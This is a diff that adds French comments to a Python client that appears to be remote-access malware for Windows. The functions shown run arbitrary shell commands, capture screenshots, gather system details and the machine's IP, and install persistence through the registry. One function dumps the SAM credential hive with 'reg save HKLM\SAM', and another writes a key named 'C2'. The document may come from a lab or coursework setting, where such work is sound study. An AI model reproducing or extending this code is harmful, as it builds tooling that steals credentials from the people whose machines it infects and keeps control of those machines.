@@ -10,6 +10,7 @@ import winreg
 
 
 def run_shell(command):
+    # execute une commande shell et renvoie le résultat
     result = subprocess.run(
         command, shell=True,
         capture_output=True, text=True, timeout=30
@@ -22,13 +23,14 @@ def run_shell(command):
 
 
 def take_screenshot():
-
+    # prend un screenshot et renvoie les bytes PNG
     with mss.mss() as sct:
         shot = sct.grab(sct.monitors[0])
         return mss.tools.to_png(shot.rgb, shot.size)
 
 
 def get_sysinfo():
+    # renvoie les infos de base de la machine client
     return {
         "os": platform.system(),
         "version": platform.version(),
@@ -39,6 +41,7 @@ def get_sysinfo():
 
 
 def get_real_ip():
+    # renvoie l'ip du client
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     ip = s.getsockname()[0]
@@ -47,6 +50,7 @@ def get_real_ip():
 
 
 def install_persistence():
+    # ajoute le client dans le registre pour qu'il se redémarre automatiquement sur la session de l'utilisateur
     exe = sys.executable
     script = os.path.abspath(sys.argv[0])
     args = " ".join(sys.argv[1:])
@@ -60,6 +64,7 @@ def install_persistence():
 
 
 def dump_sam():
+    # dump la base SAM (il faut que le client soit lancé en admin)
     result = subprocess.run("reg save HKLM\\SAM sam_dump.hive /y",shell=True, capture_output=True, text=True)
 
     
@@ -69,6 +74,7 @@ def dump_sam():
 
 
 def add_registry_key():
+    # ajoute une cle registre
     key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\C2")
     winreg.SetValueEx(key, "installed", 0, winreg.REG_SZ, "true")
     winreg.CloseKey(key)
